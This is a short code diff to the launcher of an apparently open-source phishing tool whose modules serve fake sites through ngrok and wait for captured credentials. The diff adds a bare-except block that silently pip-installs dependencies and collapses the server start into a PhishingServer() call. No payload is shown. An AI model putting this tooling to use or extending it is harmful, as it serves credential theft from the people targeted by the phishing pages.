@@ -19,8 +19,19 @@ if version_info<(3,0,0):
     exit(0)
 
 from multiprocessing import Process
-from core.view import *
-from core.pre import *
+
+# Anti Newbie :)
+try:
+    from core.view import *
+    from core.pre import *
+except:
+    import pip
+    pip.main(['install', 'huepy'])
+    pip.main(['install', 'wget'])
+    from core.view import *
+    from core.pre import *
+    clear()
+    
 from core.phishingRunner import *
 from core.sites import site
 from core.email import objsmtp
@@ -91,16 +102,10 @@ def main():
 
 if __name__ == "__main__":
     try:        
-        system('pkill -f ngrok')
-        system('pkill -f php')
         pre()
         main()
-        runNgrok()
-        Process(target=runServer).start()
-        waitCreds()
+        PhishingServer()
     except KeyboardInterrupt:
-        system('pkill -f ngrok')
-        system('pkill -f php')
         end()
         exit(0)
     finally:
